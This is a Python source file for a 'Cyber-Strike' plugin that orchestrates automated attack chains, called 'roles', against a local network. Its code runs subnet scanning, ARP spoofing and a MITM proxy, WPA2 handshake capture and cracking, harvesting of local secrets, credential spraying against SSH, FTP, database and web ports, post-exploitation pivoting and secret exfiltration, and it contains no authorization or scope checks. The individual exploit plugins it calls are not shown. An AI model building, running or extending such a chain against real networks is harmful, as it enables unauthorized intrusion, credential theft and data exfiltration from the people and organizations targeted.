from core.plugin_manager import BasePlugin
import asyncio


class CyberStrikePlugin(BasePlugin):
    def __init__(self):
        self.roles = {
            # Original roles
            "Shadow":      {"priority": "Stealth Recon",     "sequence": ["Scanner", "AI-Orchestrator"]},
            "Infiltrator": {"priority": "MITM Strike",       "sequence": ["Spoofer", "Proxy"]},
            "Ghost":       {"priority": "Signal Ghost",      "sequence": ["Wardriver", "Sniffer"]},
            # New synergistic roles
            "Phantom":     {"priority": "Full Chain",        "sequence": [
                "Scanner", "OSINT-Enricher", "Vuln-Scanner", "Exploit-Mapper",
                "Secret-Hunter", "Cred-Spray", "Post-Exploit", "Report-Builder",
            ]},
            "Specter":     {"priority": "Complete MITM",     "sequence": [
                "Spoofer", "Proxy", "Sniffer", "Web-Scanner", "Cred-Spray",
            ]},
            "Predator":    {"priority": "WiFi-to-Access",    "sequence": [
                "Wardriver", "WiFi-Strike", "Hash-Cracker", "Cred-Spray",
                "Scanner", "Vuln-Scanner", "Post-Exploit",
            ]},
            "Reaper":      {"priority": "Intel + Exploit",   "sequence": [
                "Scanner", "OSINT-Enricher", "Vuln-Scanner",
                "Exploit-Mapper", "Post-Exploit", "Report-Builder",
            ]},
        }
        self.active_role = None
        self.status = "IDLE"
        self.log = []

    @property
    def name(self) -> str:
        return "Cyber-Strike"

    @property
    def description(self) -> str:
        return "Autonomous Role-Based Strike Engine"

    async def start(self, role="Shadow", plugin_manager=None):
        self.active_role = role
        self.status = f"EXECUTING {role.upper()} PROTOCOL"
        self.log = [f"Engaging {role} protocol..."]
        self.emit("INFO", {"msg": f"Cyber-Strike: {self.status}"})

        if not plugin_manager:
            print(f"Cyber Strike active (no plugin_manager): {self.status}")
            return

        sequence = self.roles.get(role, {}).get("sequence", [])
        ctx: dict = {}

        for plugin_name in sequence:
            self.log.append(f"Activating {plugin_name}...")
            plugin = plugin_manager.get_plugin(plugin_name)
            if not plugin:
                self.log.append(f"{plugin_name} unavailable — skipping.")
                self.emit("WARN", {"msg": f"Cyber-Strike: {plugin_name} not loaded"})
                continue

            try:
                if plugin_name == "Scanner":
                    self.log.append("Scanning network for live hosts...")
                    subnet = "192.168.1.0/24"
                    devices = await asyncio.to_thread(plugin.scan, subnet)
                    ctx["devices"] = devices
                    if devices and self.target_store:
                        self.target_store.update_devices(devices)
                    self.emit("SCAN_COMPLETE", {"count": len(devices), "devices": devices})
                    self.log.append(f"Discovered {len(devices)} hosts.")

                elif plugin_name == "AI-Orchestrator":
                    self.log.append("Reasoning over discovered targets...")
                    devices = ctx.get("devices", [])
                    insights = await plugin.analyze_devices(devices)
                    ctx["insights"] = insights
                    for insight in insights:
                        self.log.append(f"Intel: {insight}")
                    self.emit("ANALYSIS_COMPLETE", {"insights": insights})

                elif plugin_name == "Spoofer":
                    self.log.append("Initiating ARP spoofing...")
                    await plugin.start()
                    # Spoof the first discovered device if available
                    devices = ctx.get("devices", [])
                    if devices:
                        target = devices[0].get("ip")
                        gateway = next(
                            (d.get("ip") for d in devices
                             if d.get("ip", "").endswith(".1") or d.get("ip", "").endswith(".254")),
                            None
                        )
                        if target and gateway:
                            await plugin.spoof(target_ip=target, gateway_ip=gateway)
                            self.log.append(f"ARP spoof active: {target} ↔ {gateway}")
                    self.emit("SPOOF_ACTIVE", {"msg": "ARP poisoning engaged"})

                elif plugin_name == "Proxy":
                    self.log.append("Starting MITM proxy on :8080...")
                    await plugin.start(port=8080)
                    self.emit("PROXY_ACTIVE", {"port": 8080})

                elif plugin_name == "Wardriver":
                    self.log.append("Wardriving — scanning local RF spectrum...")
                    networks = await asyncio.to_thread(plugin.scan_wifi)
                    ctx["networks"] = networks
                    self.emit("WIFI_SCAN_COMPLETE", {"count": len(networks), "networks": networks})
                    self.log.append(f"Found {len(networks)} wireless networks.")

                elif plugin_name == "WiFi-Strike":
                    self.log.append("WiFi-Strike: monitoring for WPA2 handshakes...")
                    await plugin.start()
                    networks = ctx.get("networks", [])
                    for net in networks[:3]:  # top 3 networks
                        bssid = net.get("mac")
                        if bssid:
                            asyncio.create_task(plugin.capture_handshake(bssid, timeout=30))
                    self.emit("WIFI_STRIKE_ACTIVE", {"targets": len(networks[:3])})

                elif plugin_name == "Hash-Cracker":
                    self.log.append("Hash-Cracker: cracking captured handshakes...")
                    handshakes = getattr(
                        plugin_manager.get_plugin("WiFi-Strike") or object(), "handshakes", []
                    )
                    for hs in handshakes:
                        pcap = hs.get("file")
                        bssid = hs.get("bssid", "")
                        if pcap:
                            asyncio.create_task(plugin.crack_pcap(pcap, bssid))
                    self.log.append(f"Crack jobs queued: {len(handshakes)}")

                elif plugin_name == "OSINT-Enricher":
                    self.log.append("OSINT enrichment running...")
                    devices = ctx.get("devices", [])
                    if devices:
                        enrichments = await plugin.enrich_batch(devices)
                        ctx["osint"] = enrichments
                        self.log.append(f"Enriched {len(enrichments)} IPs.")

                elif plugin_name == "Vuln-Scanner":
                    self.log.append("Vulnerability scan running...")
                    devices = ctx.get("devices", [])
                    if not devices and self.target_store:
                        devices = self.target_store.devices
                    all_vulns: dict = {}
                    for d in devices:
                        ip = d.get("ip")
                        if ip:
                            vulns = await plugin.scan_target(ip)
                            if vulns:
                                all_vulns[ip] = vulns
                    ctx["vulns"] = all_vulns
                    total = sum(len(v) for v in all_vulns.values())
                    self.log.append(f"Vuln scan: {total} findings across {len(all_vulns)} hosts.")
                    self.emit("VULN_COMPLETE", {"total": total, "results": all_vulns})

                elif plugin_name == "Exploit-Mapper":
                    self.log.append("Mapping CVEs to exploits...")
                    all_findings: list = []
                    for ip, vlist in ctx.get("vulns", {}).items():
                        for v in vlist:
                            v["ip"] = ip
                            all_findings.append(v)
                    if all_findings:
                        suggestions = plugin.map_cves(all_findings)
                        ctx["exploits"] = suggestions
                        self.log.append(f"Exploit-Mapper: {len(suggestions)} exploit paths found.")

                elif plugin_name == "Secret-Hunter":
                    self.log.append("Hunting secrets in local workspace...")
                    findings = await plugin.hunt()
                    ctx["secrets"] = findings
                    self.log.append(f"Secret-Hunter: {len(findings)} secrets found.")

                elif plugin_name == "Cred-Spray":
                    self.log.append("Credential spray in progress...")
                    for s in ctx.get("secrets", []):
                        plugin.add_credential(s.get("preview", ""))
                    for d in ctx.get("devices", []):
                        ip = d.get("ip")
                        if ip:
                            plugin.add_target(ip, [22, 21, 80, 443, 8080, 3306, 5432])
                    hits = await plugin.run_spray()
                    ctx["spray_hits"] = hits
                    self.log.append(f"Cred-Spray: {len(hits)} valid credentials confirmed.")

                elif plugin_name == "Post-Exploit":
                    self.log.append("Post-exploitation: pivoting and persisting...")
                    spray_hits = ctx.get("spray_hits", [])
                    target_ip = (
                        spray_hits[0]["ip"] if spray_hits else
                        (self.target_store.last_target if self.target_store else None)
                    )
                    if target_ip:
                        pivot = await plugin.pivot_scan(target_ip)
                        ctx["pivot"] = pivot
                        exfil = await plugin.exfiltrate_secrets(pivot.get("session_id", "cs"))
                        ctx["exfil"] = exfil
                        self.log.append(f"Pivoted to {target_ip}, {len(exfil)} files flagged.")

                elif plugin_name == "Web-Scanner":
                    self.log.append("Active web app scanning...")
                    for d in ctx.get("devices", []):
                        ip = d.get("ip")
                        if ip:
                            asyncio.create_task(plugin.scan(ip, port=80))
                    self.emit("WEB_SCAN_LAUNCHED", {"hosts": len(ctx.get("devices", []))})

                elif plugin_name == "Report-Builder":
                    self.log.append("Generating engagement report...")
                    result = await plugin.generate()
                    ctx["report"] = result
                    self.log.append(f"Report: {result.get('html_path', 'N/A')}")

                elif plugin_name == "Sniffer":
                    self.log.append("Deep packet inspection engaged...")
                    await plugin.start()
                    self.emit("SNIFFER_ACTIVE", {"msg": "DPI engine running"})

                else:
                    await asyncio.sleep(0.5)
                    self.log.append(f"{plugin_name} activated.")

            except Exception as exc:
                self.log.append(f"{plugin_name} error: {exc}")
                self.emit("ERROR", {"msg": f"Cyber-Strike [{plugin_name}]: {exc}"})

        self.status = f"{role.upper()} PROTOCOL COMPLETE"
        self.emit("STRIKE_COMPLETE", {"role": role, "log": self.log, "ctx_keys": list(ctx.keys())})
        print(f"Cyber Strike complete: {self.status}")

    async def stop(self):
        self.status = "IDLE"
        self.active_role = None
        self.log.append("Protocol terminated.")
        self.emit("INFO", {"msg": "Cyber-Strike: terminated"})
        print("Cyber Strike terminated.")

    def get_status(self):
        return {
            "status": self.status,
            "role":   self.active_role,
            "log":    self.log,
            "config": self.roles.get(self.active_role, {}),
        }
